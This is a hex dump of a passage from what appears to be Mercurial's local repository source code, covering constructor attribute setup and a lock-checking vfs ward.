+0000b570: 2020 6060 6279 7465 7360 6020 7061 7468    ``bytes`` path
+0000b580: 2074 6f20 776f 726b 696e 6720 6469 7265   to working dire
+0000b590: 6374 6f72 7920 726f 6f74 206f 6620 7468  ctory root of th
+0000b5a0: 6973 2072 6570 6f73 6974 6f72 792e 0a0a  is repository...
+0000b5b0: 2020 2020 2020 2020 7764 6972 7666 730a          wdirvfs.
+0000b5c0: 2020 2020 2020 2020 2020 2060 6076 6673             ``vfs
+0000b5d0: 2e76 6673 6060 2072 6f6f 7465 6420 6174  .vfs`` rooted at
+0000b5e0: 2074 6865 2077 6f72 6b69 6e67 2064 6972   the working dir
+0000b5f0: 6563 746f 7279 2e0a 0a20 2020 2020 2020  ectory...       
+0000b600: 2068 6776 6673 0a20 2020 2020 2020 2020   hgvfs.         
+0000b610: 2020 6060 7666 732e 7666 7360 6020 726f    ``vfs.vfs`` ro
+0000b620: 6f74 6564 2061 7420 2e68 672f 0a0a 2020  oted at .hg/..  
+0000b630: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+0000b640: 7473 0a20 2020 2020 2020 2020 2020 6060  ts.           ``
+0000b650: 7365 7460 6020 6f66 2062 7974 6573 7472  set`` of bytestr
+0000b660: 696e 6773 2072 6570 7265 7365 6e74 696e  ings representin
+0000b670: 6720 7265 706f 7369 746f 7279 206f 7065  g repository ope
+0000b680: 6e69 6e67 2072 6571 7569 7265 6d65 6e74  ning requirement
+0000b690: 732e 0a0a 2020 2020 2020 2020 7375 7070  s...        supp
+0000b6a0: 6f72 7465 6472 6571 7569 7265 6d65 6e74  ortedrequirement
+0000b6b0: 730a 2020 2020 2020 2020 2020 2060 6073  s.           ``s
+0000b6c0: 6574 6060 206f 6620 6279 7465 7374 7269  et`` of bytestri
+0000b6d0: 6e67 7320 7265 7072 6573 656e 7469 6e67  ngs representing
+0000b6e0: 2072 6570 6f73 6974 6f72 7920 7265 7175   repository requ
+0000b6f0: 6972 656d 656e 7473 2074 6861 7420 7765  irements that we
+0000b700: 0a20 2020 2020 2020 2020 2020 6b6e 6f77  .           know
+0000b710: 2068 6f77 2074 6f20 6f70 656e 2e20 4d61   how to open. Ma
+0000b720: 7920 6265 2061 2073 7570 6574 7365 7420  y be a supetset 
+0000b730: 6f66 2060 6072 6571 7569 7265 6d65 6e74  of ``requirement
+0000b740: 7360 602e 0a0a 2020 2020 2020 2020 7368  s``...        sh
+0000b750: 6172 6564 7061 7468 0a20 2020 2020 2020  aredpath.       
+0000b760: 2020 2020 6060 6279 7465 7360 6020 4465      ``bytes`` De
+0000b770: 6669 6e69 6e67 2070 6174 6820 746f 2073  fining path to s
+0000b780: 746f 7261 6765 2062 6173 6520 6469 7265  torage base dire
+0000b790: 6374 6f72 792e 2050 6f69 6e74 7320 746f  ctory. Points to
+0000b7a0: 2061 0a20 2020 2020 2020 2020 2020 6060   a.           ``
+0000b7b0: 2e68 672f 6060 2064 6972 6563 746f 7279  .hg/`` directory
+0000b7c0: 2073 6f6d 6577 6865 7265 2e0a 0a20 2020   somewhere...   
+0000b7d0: 2020 2020 2073 746f 7265 0a20 2020 2020       store.     
+0000b7e0: 2020 2020 2020 6060 7374 6f72 652e 6261        ``store.ba
+0000b7f0: 7369 6373 746f 7265 6060 2028 6f72 2064  sicstore`` (or d
+0000b800: 6572 6976 6564 2920 696e 7374 616e 6365  erived) instance
+0000b810: 2070 726f 7669 6469 6e67 2061 6363 6573   providing acces
+0000b820: 7320 746f 0a20 2020 2020 2020 2020 2020  s to.           
+0000b830: 7665 7273 696f 6e65 6420 7374 6f72 6167  versioned storag
+0000b840: 652e 0a0a 2020 2020 2020 2020 6361 6368  e...        cach
+0000b850: 6576 6673 0a20 2020 2020 2020 2020 2020  evfs.           
+0000b860: 6060 7666 732e 7666 7360 6020 7573 6564  ``vfs.vfs`` used
+0000b870: 2066 6f72 2063 6163 6865 2066 696c 6573   for cache files
+0000b880: 2e0a 0a20 2020 2020 2020 2077 6361 6368  ...        wcach
+0000b890: 6576 6673 0a20 2020 2020 2020 2020 2020  evfs.           
+0000b8a0: 6060 7666 732e 7666 7360 6020 7573 6564  ``vfs.vfs`` used
+0000b8b0: 2066 6f72 2063 6163 6865 2066 696c 6573   for cache files
+0000b8c0: 2072 656c 6174 6564 2074 6f20 7468 6520   related to the 
+0000b8d0: 776f 726b 696e 6720 636f 7079 2e0a 0a20  working copy... 
+0000b8e0: 2020 2020 2020 2066 6561 7475 7265 730a         features.
+0000b8f0: 2020 2020 2020 2020 2020 2060 6073 6574             ``set
+0000b900: 6060 206f 6620 6279 7465 7374 7269 6e67  `` of bytestring
+0000b910: 7320 6465 6669 6e69 6e67 2066 6561 7475  s defining featu
+0000b920: 7265 732f 6361 7061 6269 6c69 7469 6573  res/capabilities
+0000b930: 206f 6620 7468 6973 0a20 2020 2020 2020   of this.       
+0000b940: 2020 2020 696e 7374 616e 6365 2e0a 0a20      instance... 
+0000b950: 2020 2020 2020 2069 6e74 656e 7473 0a20         intents. 
+0000b960: 2020 2020 2020 2020 2020 6060 7365 7460            ``set`
+0000b970: 6020 6f66 2073 7973 7465 6d20 7374 7269  ` of system stri
+0000b980: 6e67 7320 696e 6469 6361 7469 6e67 2077  ngs indicating w
+0000b990: 6861 7420 7468 6973 2072 6570 6f20 7769  hat this repo wi
+0000b9a0: 6c6c 2062 6520 7573 6564 0a20 2020 2020  ll be used.     
+0000b9b0: 2020 2020 2020 666f 722e 0a20 2020 2020        for..     
+0000b9c0: 2020 2022 2222 0a20 2020 2020 2020 2073     """.        s
+0000b9d0: 656c 662e 6261 7365 7569 203d 2062 6173  elf.baseui = bas
+0000b9e0: 6575 690a 2020 2020 2020 2020 7365 6c66  eui.        self
+0000b9f0: 2e75 6920 3d20 7569 0a20 2020 2020 2020  .ui = ui.       
+0000ba00: 2073 656c 662e 6f72 6967 726f 6f74 203d   self.origroot =
+0000ba10: 206f 7269 6772 6f6f 740a 2020 2020 2020   origroot.      
+0000ba20: 2020 2320 7666 7320 726f 6f74 6564 2061    # vfs rooted a
+0000ba30: 7420 776f 726b 696e 6720 6469 7265 6374  t working direct
+0000ba40: 6f72 792e 0a20 2020 2020 2020 2073 656c  ory..        sel
+0000ba50: 662e 7776 6673 203d 2077 6469 7276 6673  f.wvfs = wdirvfs
+0000ba60: 0a20 2020 2020 2020 2073 656c 662e 726f  .        self.ro
+0000ba70: 6f74 203d 2077 6469 7276 6673 2e62 6173  ot = wdirvfs.bas
+0000ba80: 650a 2020 2020 2020 2020 2320 7666 7320  e.        # vfs 
+0000ba90: 726f 6f74 6564 2061 7420 2e68 672f 2e20  rooted at .hg/. 
+0000baa0: 5573 6564 2074 6f20 6163 6365 7373 206d  Used to access m
+0000bab0: 6f73 7420 6e6f 6e2d 7374 6f72 6520 7061  ost non-store pa
+0000bac0: 7468 732e 0a20 2020 2020 2020 2073 656c  ths..        sel
+0000bad0: 662e 7666 7320 3d20 6867 7666 730a 2020  f.vfs = hgvfs.  
+0000bae0: 2020 2020 2020 7365 6c66 2e70 6174 6820        self.path 
+0000baf0: 3d20 6867 7666 732e 6261 7365 0a20 2020  = hgvfs.base.   
+0000bb00: 2020 2020 2073 656c 662e 7265 7175 6972       self.requir
+0000bb10: 656d 656e 7473 203d 2072 6571 7569 7265  ements = require
+0000bb20: 6d65 6e74 730a 2020 2020 2020 2020 7365  ments.        se
+0000bb30: 6c66 2e6e 6f64 6563 6f6e 7374 616e 7473  lf.nodeconstants
+0000bb40: 203d 2073 6861 316e 6f64 6563 6f6e 7374   = sha1nodeconst
+0000bb50: 616e 7473 0a20 2020 2020 2020 2073 656c  ants.        sel
+0000bb60: 662e 6e75 6c6c 6964 203d 2073 656c 662e  f.nullid = self.
+0000bb70: 6e6f 6465 636f 6e73 7461 6e74 732e 6e75  nodeconstants.nu
+0000bb80: 6c6c 6964 0a20 2020 2020 2020 2073 656c  llid.        sel
+0000bb90: 662e 7375 7070 6f72 7465 6420 3d20 7375  f.supported = su
+0000bba0: 7070 6f72 7465 6472 6571 7569 7265 6d65  pportedrequireme
+0000bbb0: 6e74 730a 2020 2020 2020 2020 7365 6c66  nts.        self
+0000bbc0: 2e73 6861 7265 6470 6174 6820 3d20 7368  .sharedpath = sh
+0000bbd0: 6172 6564 7061 7468 0a20 2020 2020 2020  aredpath.       
+0000bbe0: 2073 656c 662e 7374 6f72 6520 3d20 7374   self.store = st
+0000bbf0: 6f72 650a 2020 2020 2020 2020 7365 6c66  ore.        self
+0000bc00: 2e63 6163 6865 7666 7320 3d20 6361 6368  .cachevfs = cach
+0000bc10: 6576 6673 0a20 2020 2020 2020 2073 656c  evfs.        sel
+0000bc20: 662e 7763 6163 6865 7666 7320 3d20 7763  f.wcachevfs = wc
+0000bc30: 6163 6865 7666 730a 2020 2020 2020 2020  achevfs.        
+0000bc40: 7365 6c66 2e66 6561 7475 7265 7320 3d20  self.features = 
+0000bc50: 6665 6174 7572 6573 0a0a 2020 2020 2020  features..      
+0000bc60: 2020 7365 6c66 2e66 696c 7465 726e 616d    self.filternam
+0000bc70: 6520 3d20 4e6f 6e65 0a0a 2020 2020 2020  e = None..      
+0000bc80: 2020 6966 2073 656c 662e 7569 2e63 6f6e    if self.ui.con
+0000bc90: 6669 6762 6f6f 6c28 6227 6465 7665 6c27  figbool(b'devel'
+0000bca0: 2c20 6227 616c 6c2d 7761 726e 696e 6773  , b'all-warnings
+0000bcb0: 2729 206f 7220 7365 6c66 2e75 692e 636f  ') or self.ui.co
+0000bcc0: 6e66 6967 626f 6f6c 280a 2020 2020 2020  nfigbool(.      
+0000bcd0: 2020 2020 2020 6227 6465 7665 6c27 2c20        b'devel', 
+0000bce0: 6227 6368 6563 6b2d 6c6f 636b 7327 0a20  b'check-locks'. 
+0000bcf0: 2020 2020 2020 2029 3a0a 2020 2020 2020         ):.      
+0000bd00: 2020 2020 2020 7365 6c66 2e76 6673 2e61        self.vfs.a
+0000bd10: 7564 6974 203d 2073 656c 662e 5f67 6574  udit = self._get
+0000bd20: 7666 7377 6172 6428 7365 6c66 2e76 6673  vfsward(self.vfs
+0000bd30: 2e61 7564 6974 290a 2020 2020 2020 2020  .audit).        
+0000bd40: 2320 4120 6c69 7374 206f 6620 6361 6c6c  # A list of call
+0000bd50: 6261 636b 2074 6f20 7368 6170 6520 7468  back to shape th
+0000bd60: 6520 7068 6173 6520 6966 206e 6f20 6461  e phase if no da
+0000bd70: 7461 2077 6572 6520 666f 756e 642e 0a20  ta were found.. 
+0000bd80: 2020 2020 2020 2023 2043 616c 6c62 6163         # Callbac
+0000bd90: 6b20 6172 6520 696e 2074 6865 2066 6f72  k are in the for
+0000bda0: 6d3a 2066 756e 6328 7265 706f 2c20 726f  m: func(repo, ro
+0000bdb0: 6f74 7329 202d 2d3e 2070 726f 6365 7373  ots) --> process
+0000bdc0: 6564 2072 6f6f 742e 0a20 2020 2020 2020  ed root..       
+0000bdd0: 2023 2054 6869 7320 6c69 7374 2069 7420   # This list it 
+0000bde0: 746f 2062 6520 6669 6c6c 6564 2062 7920  to be filled by 
+0000bdf0: 6578 7465 6e73 696f 6e20 6475 7269 6e67  extension during
+0000be00: 2072 6570 6f20 7365 7475 700a 2020 2020   repo setup.    
+0000be10: 2020 2020 7365 6c66 2e5f 7068 6173 6564      self._phased
+0000be20: 6566 6175 6c74 7320 3d20 5b5d 0a0a 2020  efaults = []..  
+0000be30: 2020 2020 2020 636f 6c6f 722e 7365 7475        color.setu
+0000be40: 7028 7365 6c66 2e75 6929 0a0a 2020 2020  p(self.ui)..    
+0000be50: 2020 2020 7365 6c66 2e73 7061 7468 203d      self.spath =
+0000be60: 2073 656c 662e 7374 6f72 652e 7061 7468   self.store.path
+0000be70: 0a20 2020 2020 2020 2073 656c 662e 7376  .        self.sv
+0000be80: 6673 203d 2073 656c 662e 7374 6f72 652e  fs = self.store.
+0000be90: 7666 730a 2020 2020 2020 2020 7365 6c66  vfs.        self
+0000bea0: 2e73 6a6f 696e 203d 2073 656c 662e 7374  .sjoin = self.st
+0000beb0: 6f72 652e 6a6f 696e 0a20 2020 2020 2020  ore.join.       
+0000bec0: 2069 6620 7365 6c66 2e75 692e 636f 6e66   if self.ui.conf
+0000bed0: 6967 626f 6f6c 2862 2764 6576 656c 272c  igbool(b'devel',
+0000bee0: 2062 2761 6c6c 2d77 6172 6e69 6e67 7327   b'all-warnings'
+0000bef0: 2920 6f72 2073 656c 662e 7569 2e63 6f6e  ) or self.ui.con
+0000bf00: 6669 6762 6f6f 6c28 0a20 2020 2020 2020  figbool(.       
+0000bf10: 2020 2020 2062 2764 6576 656c 272c 2062       b'devel', b
+0000bf20: 2763 6865 636b 2d6c 6f63 6b73 270a 2020  'check-locks'.  
+0000bf30: 2020 2020 2020 293a 0a20 2020 2020 2020        ):.       
+0000bf40: 2020 2020 2069 6620 7574 696c 2e73 6166       if util.saf
+0000bf50: 6568 6173 6174 7472 2873 656c 662e 7376  ehasattr(self.sv
+0000bf60: 6673 2c20 6227 7666 7327 293a 2020 2320  fs, b'vfs'):  # 
+0000bf70: 7468 6973 2069 7320 6669 6c74 6572 7666  this is filtervf
+0000bf80: 730a 2020 2020 2020 2020 2020 2020 2020  s.              
+0000bf90: 2020 7365 6c66 2e73 7666 732e 7666 732e    self.svfs.vfs.
+0000bfa0: 6175 6469 7420 3d20 7365 6c66 2e5f 6765  audit = self._ge
+0000bfb0: 7473 7666 7377 6172 6428 7365 6c66 2e73  tsvfsward(self.s
+0000bfc0: 7666 732e 7666 732e 6175 6469 7429 0a20  vfs.vfs.audit). 
+0000bfd0: 2020 2020 2020 2020 2020 2065 6c73 653a             else:
+0000bfe0: 2020 2320 7374 616e 6461 7264 2076 6673    # standard vfs
+0000bff0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0000c000: 2073 656c 662e 7376 6673 2e61 7564 6974   self.svfs.audit
+0000c010: 203d 2073 656c 662e 5f67 6574 7376 6673   = self._getsvfs
+0000c020: 7761 7264 2873 656c 662e 7376 6673 2e61  ward(self.svfs.a
+0000c030: 7564 6974 290a 0a20 2020 2020 2020 2073  udit)..        s
+0000c040: 656c 662e 5f64 6972 7374 6174 6576 616c  elf._dirstateval
+0000c050: 6964 6174 6577 6172 6e65 6420 3d20 4661  idatewarned = Fa
+0000c060: 6c73 650a 0a20 2020 2020 2020 2073 656c  lse..        sel
+0000c070: 662e 5f62 7261 6e63 6863 6163 6865 7320  f._branchcaches 
+0000c080: 3d20 6272 616e 6368 6d61 702e 4272 616e  = branchmap.Bran
+0000c090: 6368 4d61 7043 6163 6865 2829 0a20 2020  chMapCache().   
+0000c0a0: 2020 2020 2073 656c 662e 5f72 6576 6272       self._revbr
+0000c0b0: 616e 6368 6361 6368 6520 3d20 4e6f 6e65  anchcache = None
+0000c0c0: 0a20 2020 2020 2020 2073 656c 662e 5f66  .        self._f
+0000c0d0: 696c 7465 7270 6174 7320 3d20 7b7d 0a20  ilterpats = {}. 
+0000c0e0: 2020 2020 2020 2073 656c 662e 5f64 6174         self._dat
+0000c0f0: 6166 696c 7465 7273 203d 207b 7d0a 2020  afilters = {}.  
+0000c100: 2020 2020 2020 7365 6c66 2e5f 7472 616e        self._tran
+0000c110: 7372 6566 203d 2073 656c 662e 5f6c 6f63  sref = self._loc
+0000c120: 6b72 6566 203d 2073 656c 662e 5f77 6c6f  kref = self._wlo
+0000c130: 636b 7265 6620 3d20 4e6f 6e65 0a0a 2020  ckref = None..  
+0000c140: 2020 2020 2020 2320 4120 6361 6368 6520        # A cache 
+0000c150: 666f 7220 7661 7269 6f75 7320 6669 6c65  for various file
+0000c160: 7320 756e 6465 7220 2e68 672f 2074 6861  s under .hg/ tha
+0000c170: 7420 7472 6163 6b73 2066 696c 6520 6368  t tracks file ch
+0000c180: 616e 6765 732c 0a20 2020 2020 2020 2023  anges,.        #
+0000c190: 2028 7573 6564 2062 7920 7468 6520 6669   (used by the fi
+0000c1a0: 6c65 6361 6368 6520 6465 636f 7261 746f  lecache decorato
+0000c1b0: 7229 0a20 2020 2020 2020 2023 0a20 2020  r).        #.   
+0000c1c0: 2020 2020 2023 204d 6170 7320 6120 7072       # Maps a pr
+0000c1d0: 6f70 6572 7479 206e 616d 6520 746f 2069  operty name to i
+0000c1e0: 7473 2075 7469 6c2e 6669 6c65 6361 6368  ts util.filecach
+0000c1f0: 6565 6e74 7279 0a20 2020 2020 2020 2073  eentry.        s
+0000c200: 656c 662e 5f66 696c 6563 6163 6865 203d  elf._filecache =
+0000c210: 207b 7d0a 0a20 2020 2020 2020 2023 2068   {}..        # h
+0000c220: 6f6c 6420 7365 7473 206f 6620 7265 7669  old sets of revi
+0000c230: 7369 6f6e 2074 6f20 6265 2066 696c 7465  sion to be filte
+0000c240: 7265 640a 2020 2020 2020 2020 2320 7368  red.        # sh
+0000c250: 6f75 6c64 2062 6520 636c 6561 7265 6420  ould be cleared 
+0000c260: 7768 656e 2073 6f6d 6574 6869 6e67 206d  when something m
+0000c270: 6967 6874 2068 6176 6520 6368 616e 6765  ight have change
+0000c280: 6420 7468 6520 6669 6c74 6572 2076 616c  d the filter val
+0000c290: 7565 3a0a 2020 2020 2020 2020 2320 2d20  ue:.        # - 
+0000c2a0: 6e65 7720 6368 616e 6765 7365 7473 2c0a  new changesets,.
+0000c2b0: 2020 2020 2020 2020 2320 2d20 7068 6173          # - phas
+0000c2c0: 6520 6368 616e 6765 2c0a 2020 2020 2020  e change,.      
+0000c2d0: 2020 2320 2d20 6e65 7720 6f62 736f 6c65    # - new obsole
+0000c2e0: 7363 656e 6365 206d 6172 6b65 722c 0a20  scence marker,. 
+0000c2f0: 2020 2020 2020 2023 202d 2077 6f72 6b69         # - worki
+0000c300: 6e67 2064 6972 6563 746f 7279 2070 6172  ng directory par
+0000c310: 656e 7420 6368 616e 6765 2c0a 2020 2020  ent change,.    
+0000c320: 2020 2020 2320 2d20 626f 6f6b 6d61 726b      # - bookmark
+0000c330: 2063 6861 6e67 6573 0a20 2020 2020 2020   changes.       
+0000c340: 2073 656c 662e 6669 6c74 6572 6564 7265   self.filteredre
+0000c350: 7663 6163 6865 203d 207b 7d0a 0a20 2020  vcache = {}..   
+0000c360: 2020 2020 2073 656c 662e 5f64 6972 7374       self._dirst
+0000c370: 6174 6520 3d20 4e6f 6e65 0a20 2020 2020  ate = None.     
+0000c380: 2020 2023 2070 6f73 742d 6469 7273 7461     # post-dirsta
+0000c390: 7465 2d73 7461 7475 7320 686f 6f6b 730a  te-status hooks.
+0000c3a0: 2020 2020 2020 2020 7365 6c66 2e5f 706f          self._po
+0000c3b0: 7374 6473 7374 6174 7573 203d 205b 5d0a  stdsstatus = [].
+0000c3c0: 0a20 2020 2020 2020 2073 656c 662e 5f70  .        self._p
+0000c3d0: 656e 6469 6e67 5f6e 6172 726f 775f 7061  ending_narrow_pa
+0000c3e0: 7473 203d 204e 6f6e 650a 2020 2020 2020  ts = None.      
+0000c3f0: 2020 7365 6c66 2e5f 7065 6e64 696e 675f    self._pending_
+0000c400: 6e61 7272 6f77 5f70 6174 735f 6469 7273  narrow_pats_dirs
+0000c410: 7461 7465 203d 204e 6f6e 650a 0a20 2020  tate = None..   
+0000c420: 2020 2020 2023 2067 656e 6572 6963 206d       # generic m
+0000c430: 6170 7069 6e67 2062 6574 7765 656e 206e  apping between n
+0000c440: 616d 6573 2061 6e64 206e 6f64 6573 0a20  ames and nodes. 
+0000c450: 2020 2020 2020 2073 656c 662e 6e61 6d65         self.name
+0000c460: 7320 3d20 6e61 6d65 7370 6163 6573 2e6e  s = namespaces.n
+0000c470: 616d 6573 7061 6365 7328 290a 0a20 2020  amespaces()..   
+0000c480: 2020 2020 2023 204b 6579 2074 6f20 7369       # Key to si
+0000c490: 676e 6174 7572 6520 7661 6c75 652e 0a20  gnature value.. 
+0000c4a0: 2020 2020 2020 2073 656c 662e 5f73 7061         self._spa
+0000c4b0: 7273 6573 6967 6e61 7475 7265 6361 6368  rsesignaturecach
+0000c4c0: 6520 3d20 7b7d 0a20 2020 2020 2020 2023  e = {}.        #
+0000c4d0: 2053 6967 6e61 7475 7265 2074 6f20 6361   Signature to ca
+0000c4e0: 6368 6564 206d 6174 6368 6572 2069 6e73  ched matcher ins
+0000c4f0: 7461 6e63 652e 0a20 2020 2020 2020 2073  tance..        s
+0000c500: 656c 662e 5f73 7061 7273 656d 6174 6368  elf._sparsematch
+0000c510: 6572 6361 6368 6520 3d20 7b7d 0a0a 2020  ercache = {}..  
+0000c520: 2020 2020 2020 7365 6c66 2e5f 6578 7472        self._extr
+0000c530: 6166 696c 7465 7269 6420 3d20 7265 706f  afilterid = repo
+0000c540: 7669 6577 2e65 7874 7261 6669 6c74 6572  view.extrafilter
+0000c550: 2875 6929 0a0a 2020 2020 2020 2020 7365  (ui)..        se
+0000c560: 6c66 2e66 696c 6563 6f70 6965 736d 6f64  lf.filecopiesmod
+0000c570: 6520 3d20 4e6f 6e65 0a20 2020 2020 2020  e = None.       
+0000c580: 2069 6620 7265 7175 6972 656d 656e 7473   if requirements
+0000c590: 6d6f 642e 434f 5049 4553 5344 435f 5245  mod.COPIESSDC_RE
+0000c5a0: 5155 4952 454d 454e 5420 696e 2073 656c  QUIREMENT in sel
+0000c5b0: 662e 7265 7175 6972 656d 656e 7473 3a0a  f.requirements:.
+0000c5c0: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+0000c5d0: 2e66 696c 6563 6f70 6965 736d 6f64 6520  .filecopiesmode 
+0000c5e0: 3d20 6227 6368 616e 6765 7365 742d 7369  = b'changeset-si
+0000c5f0: 6465 6461 7461 270a 0a20 2020 2020 2020  dedata'..       
+0000c600: 2073 656c 662e 5f77 616e 7465 645f 7369   self._wanted_si
+0000c610: 6465 6461 7461 203d 2073 6574 2829 0a20  dedata = set(). 
+0000c620: 2020 2020 2020 2073 656c 662e 5f73 6964         self._sid
+0000c630: 6564 6174 615f 636f 6d70 7574 6572 7320  edata_computers 
+0000c640: 3d20 7b7d 0a20 2020 2020 2020 2073 6964  = {}.        sid
+0000c650: 6564 6174 616d 6f64 2e73 6574 5f73 6964  edatamod.set_sid
+0000c660: 6564 6174 615f 7370 6563 5f66 6f72 5f72  edata_spec_for_r
+0000c670: 6570 6f28 7365 6c66 290a 0a20 2020 2064  epo(self)..    d
+0000c680: 6566 205f 6765 7476 6673 7761 7264 2873  ef _getvfsward(s
+0000c690: 656c 662c 206f 7269 6766 756e 6329 3a0a  elf, origfunc):.
+0000c6a0: 2020 2020 2020 2020 2222 2262 7569 6c64          """build
+0000c6b0: 2061 2077 6172 6420 666f 7220 7365 6c66   a ward for self
+0000c6c0: 2e76 6673 2222 220a 2020 2020 2020 2020  .vfs""".        
+0000c6d0: 7272 6566 203d 2077 6561 6b72 6566 2e72  rref = weakref.r
+0000c6e0: 6566 2873 656c 6629 0a0a 2020 2020 2020  ef(self)..      
+0000c6f0: 2020 6465 6620 6368 6563 6b76 6673 2870    def checkvfs(p
+0000c700: 6174 682c 206d 6f64 653d 4e6f 6e65 293a  ath, mode=None):
+0000c710: 0a20 2020 2020 2020 2020 2020 2072 6574  .            ret
+0000c720: 203d 206f 7269 6766 756e 6328 7061 7468   = origfunc(path
+0000c730: 2c20 6d6f 6465 3d6d 6f64 6529 0a20 2020  , mode=mode).   
+0000c740: 2020 2020 2020 2020 2072 6570 6f20 3d20           repo = 
+0000c750: 7272 6566 2829 0a20 2020 2020 2020 2020  rref().         
+0000c760: 2020 2069 6620 280a 2020 2020 2020 2020     if (.        
+0000c770: 2020 2020 2020 2020 7265 706f 2069 7320          repo is 
+0000c780: 4e6f 6e65 0a20 2020 2020 2020 2020 2020  None.           
+0000c790: 2020 2020 206f 7220 6e6f 7420 7574 696c       or not util
+0000c7a0: 2e73 6166 6568 6173 6174 7472 2872 6570  .safehasattr(rep
+0000c7b0: 6f2c 2062 275f 776c 6f63 6b72 6566 2729  o, b'_wlockref')
+0000c7c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0000c7d0: 206f 7220 6e6f 7420 7574 696c 2e73 6166   or not util.saf
+0000c7e0: 6568 6173 6174 7472 2872 6570 6f2c 2062  ehasattr(repo, b
+0000c7f0: 275f 6c6f 636b 7265 6627 290a 2020 2020  '_lockref').    
+0000c800: 2020 2020 2020 2020 293a 0a20 2020 2020          ):.     
+0000c810: 2020 2020 2020 2020 2020 2072 6574 7572             retur
+0000c820: 6e0a 2020 2020 2020 2020 2020 2020 6966  n.            if
+0000c830: 206d 6f64 6520 696e 2028 4e6f 6e65 2c20   mode in (None, 
+0000c840: 6227 7227 2c20 6227 7262 2729 3a0a 2020  b'r', b'rb'):.  
+0000c850: 2020 2020 2020 2020 2020 2020 2020 7265                re
+0000c860: 7475 726e 0a20 2020 2020 2020 2020 2020  turn.           
+0000c870: 2069 6620 7061 7468 2e73 7461 7274 7377   if path.startsw
+0000c880: 6974 6828 7265 706f 2e70 6174 6829 3a0a  ith(repo.path):.
+0000c890: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000c8a0: 2320 7472 756e 6361 7465 206e 616d 6520  # truncate name 
+0000c8b0: 7265 6c61 7469 7665 2074 6f20 7468 6520  relative to the 
+0000c8c0: 7265 706f 7369 746f 7279 2028 2e68 6729  repository (.hg)
+0000c8d0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0000c8e0: 2070 6174 6820 3d20 7061 7468 5b6c 656e   path = path[len
+0000c8f0: 2872 6570 6f2e 7061 7468 2920 2b20 3120  (repo.path) + 1 
+0000c900: 3a5d 0a20 2020 2020 2020 2020 2020 2069  :].            i
+0000c910: 6620 7061 7468 2e73 7461 7274 7377 6974  f path.startswit
+0000c920: 6828 6227 6361 6368 652f 2729 3a0a 2020  h(b'cache/'):.  
+0000c930: 2020 2020 2020 2020 2020 2020 2020 6d73                ms
+0000c940: 6720 3d20 6227 6163 6365 7373 696e 6720  g = b'accessing 
+0000c950: 6361 6368 6520 7769 7468 2076 6673 2069  cache with vfs i
+0000c960: 6e73 7465 6164 206f 6620 6361 6368 6576  nstead of cachev
+0000c970: 6673 3a20 2225 7322 270a 2020 2020 2020  fs: "%s"'.      
+0000c980: 2020 2020 2020 2020 2020 7265 706f 2e75            repo.u
+0000c990: 692e 6465 7665 6c77 6172 6e28 6d73 6720  i.develwarn(msg 
+0000c9a0: 2520 7061 7468 2c20 7374 6163 6b6c 6576  % path, stacklev
+0000c9b0: 656c 3d33 2c20 636f 6e66 6967 3d62 2263  el=3, config=b"c
+0000c9c0: 6163 6865 2d76 6673 2229 0a20 2020 2020  ache-vfs").     
+0000c9d0: 2020 2020 2020 2023 2070 6174 6820 7072         # path pr
+0000c9e0: 6566 6978 6573 2063 6f76 6572 6564 2062  efixes covered b
+0000c9f0: 7920 276c 6f63 6b27 0a20 2020 2020 2020  y 'lock'.       
+0000ca00: 2020 2020 2076 6673 5f70 6174 685f 7072       vfs_path_pr
+0000ca10: 6566 6978 6573 203d 2028 0a20 2020 2020  efixes = (.     
+0000ca20: 2020 2020 2020 2020 2020 2062 276a 6f75             b'jou
+0000ca30: 726e 616c 2e27 2c0a 2020 2020 2020 2020  rnal.',.        
+0000ca40: 2020 2020 2020 2020 6227 756e 646f 2e27          b'undo.'
+0000ca50: 2c0a 2020 2020 2020 2020 2020 2020 2020  ,.              
+0000ca60: 2020 6227 7374 7269 702d 6261 636b 7570    b'strip-backup
+0000ca70: 2f27 2c0a 2020 2020 2020 2020 2020 2020  /',.            
+0000ca80: 2020 2020 6227 6361 6368 652f 272c 0a20      b'cache/',. 
+0000ca90: 2020 2020 2020 2020 2020 2029 0a20 2020             ).   
+0000caa0: 2020 2020 2020 2020 2069 6620 616e 7928           if any(
+0000cab0: 7061 7468 2e73 7461 7274 7377 6974 6828  path.startswith(
+0000cac0: 7072 6566 6978 2920 666f 7220 7072 6566  prefix) for pref
+0000cad0: 6978 2069 6e20 7666 735f 7061 7468 5f70  ix in vfs_path_p
+0000cae0: 7265 6669 7865 7329 3a0a 2020 2020 2020  refixes):.      
+0000caf0: 2020 2020 2020 2020 2020 6966 2072 6570            if rep
+0000cb00: 6f2e 5f63 7572 7265 6e74 6c6f 636b 2872  o._currentlock(r
+0000cb10: 6570 6f2e 5f6c 6f63 6b72 6566 2920 6973  epo._lockref) is
+0000cb20: 204e 6f6e 653a 0a20 2020 2020 2020 2020   None:.         
+0000cb30: 2020 2020 2020 2020 2020 2072 6570 6f2e             repo.
+0000cb40: 7569 2e64 6576 656c 7761 726e 280a 2020  ui.develwarn(.  
+0000cb50: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cb60: 2020 2020 2020 6227 7772 6974 6520 7769        b'write wi
+0000cb70: 7468 206e 6f20 6c6f 636b 3a20 2225 7322  th no lock: "%s"
+0000cb80: 2720 2520 7061 7468 2c0a 2020 2020 2020  ' % path,.      
+0000cb90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cba0: 2020 7374 6163 6b6c 6576 656c 3d33 2c0a    stacklevel=3,.
+0000cbb0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cbc0: 2020 2020 2020 2020 636f 6e66 6967 3d62          config=b
+0000cbd0: 2763 6865 636b 2d6c 6f63 6b73 272c 0a20  'check-locks',. 
+0000cbe0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cbf0: 2020 2029 0a20 2020 2020 2020 2020 2020     ).           
+0000cc00: 2065 6c69 6620 7265 706f 2e5f 6375 7272   elif repo._curr
+0000cc10: 656e 746c 6f63 6b28 7265 706f 2e5f 776c  entlock(repo._wl
+0000cc20: 6f63 6b72 6566 2920 6973 204e 6f6e 653a  ockref) is None:
 0000cc30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
